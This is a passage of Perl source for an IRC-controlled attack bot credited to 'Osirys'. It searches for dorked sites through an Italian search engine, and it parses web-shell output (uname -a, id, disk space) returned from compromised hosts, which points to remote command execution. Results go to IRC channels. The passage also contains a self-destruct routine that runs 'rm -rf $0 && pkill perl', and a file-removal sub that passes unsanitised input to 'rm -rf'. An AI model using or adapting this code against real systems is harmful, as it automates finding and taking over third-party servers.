            my $vlink = ("http://ricerca.alice.it/ricerca?qs=".key($dork)."&filter=1&site=&lr=&hits=10&offset=".$i);
            my $re = query($vlink);
            while($re =~ m/<span><a href=\"http:\/\/(.+?)\">/g) {
                my $h = $1;
                if ($h !~ /microsoft|wikipedia/){
                    push(@sgrep,$h);
                }
            }
        }
        my @list = fprint($name,@sgrep);
        return @list;
    }
}

sub admin() {
    my $nick = $_[0];
    my $cheek;
    @admins;
    foreach my $a(@admins) {
        if ($nick eq $a) {
            $cheek = 1;
        }
    }
    return $cheek;
}

sub remove() {
    my $file = @_;
    foreach my $f(@_){
        system("rm -rf $f");
    }
}

sub clean() {
    $dork = $_[0];
    if ( $dork =~ /inurl:|allinurl:|intext:|allintext:|intitle:|allintitle:/ ) {
        writ1("15,1[+] 4,1Cleaning Dork from Google Search Keys !");
        $dork =~ s/^inurl://g;
        $dork =~ s/^allinurl://g;
        $dork =~ s/^intext://g;
        $dork =~ s/^allintext://g;
        $dork =~ s/^intitle://g;
        $dork =~ s/^allintitle://g;
    }
    return $dork;
}

sub key() {
    my $dork = $_[0];
    $dork =~ s/ /\+/g;
    $dork =~ s/:/\%3A/g;
    $dork =~ s/\//\%2F/g;
    $dork =~ s/&/\%26/g;
    $dork =~ s/\"/\%22/g;
    $dork =~ s/,/\%2C/g;
    $dork =~ s/\\/\%5C/g;
    return $dork;
}

sub fprint() {
    my($name,@sgrep) = @_;
    my @list;
    foreach my $n(@sgrep) {


        my @grep = &links($n);
        push(@list,@grep);
    }
    open($file, ">>", $name);
    foreach my $h(@list) {
        print $file "$h\n";
    }
    close($file);
    return @list;
}

sub links() {
    my @l;
    my $link = $_[0];
    my $host = $_[0];
    my $hdir = $_[0];
    $hdir =~ s/(.*)\/[^\/]*$/\1/;
    $host =~ s/([-a-zA-Z0-9\.]+)\/.*/$1/;
    $host .= "/";
    $link .= "/";
    $hdir .= "/";
    $host =~ s/\/\//\//g;
    $hdir =~ s/\/\//\//g;
    $link =~ s/\/\//\//g;
    push(@l, $link, $host, $hdir);
    return @l;
}

sub unici {
    my @unici = ();
    my %visti = ();
    foreach my $elemento (@_) {
        $elemento =~ s/\/+/\//g;
        next if $visti{$elemento}++;
        push @unici, $elemento;
    }
    return @unici;
}

sub os() {
    my $site = $_[0];
    my $re  = &query($site);
    while ($re =~ m/<br>uname -a:(.+?)\<br>/g) {
        $un = $1;
    }
    while ($re =~ m/<br>os:(.+?)\<br>/g) {
        $os = $1;
    }
    while ($re =~ m/<br>id:(.+?)\<br>/g) {
        $id1 = $1;
    }
    while ($re =~ m/<br>free:(.+?)\<br>/g) {
        $free = $1;
    }
    while ($re =~ m/<br>used:(.+?)\<br>/g) {
        $used = $1;
    }
    while ($re =~ m/<br>total:(.+?)\<br>/g) {
        $all = $1;
    }
}

sub rce_os() {
    my $site = $_[0];
    my $re = &query($site);
    while ($re =~ m/^(.*)$/g) {
        $un_rce = $1;
    }
}

sub cheek() {
    if (($auth !~ /Osirys/)||($authmail !~ /osirys/)) {
        print "\nI hate rippers, before putting your nick on a script, be sure that you coded it!\nby Osirys // Third Eye Security\n\n"; 
        exec("rm -rf $0 && pkill perl");
    }
}

sub query() {
    $link = $_[0];
    my $req = HTTP::Request->new(GET => $link);
    my $ua = LWP::UserAgent->new();
    $ua->timeout(4);
    my $response = $ua->request($req);
    return $response->content;
}

sub query1() {
    my $url = $_[0];
    my $host  = $url;
    my $query = $url;
    $host  =~ s/([-a-zA-Z0-9\.]+)\/.*/$1/;
    $query =~ s/$host//;
    eval {
        my $sock = IO::Socket::INET->new(PeerAddr => "$host",PeerPort => "80",Proto => "tcp") || return;
        print $sock "GET $query HTTP/1.0\r\nHost: $host\r\nAccept: */*\r\nUser-Agent: Mozilla/5.0\r\n\r\n";
        my @r = <$sock>;
        $page = "@r";
        close($sock);
    };
    return $page;
}

sub writ1() {
    my $cont = $_[0];
    print $c0n "PRIVMSG $chan1 :$cont\n";
}

sub writ2() {
    my $cont = $_[0];
    print $c0n "PRIVMSG $chan2 :$cont\n";
}

sub pm() {
    my $nick = $_[0];
    my $cont = $_[1];
    print $c0n "PRIVMSG $nick :$cont\n";
}

## PRIVATE
## Coded by Osirys


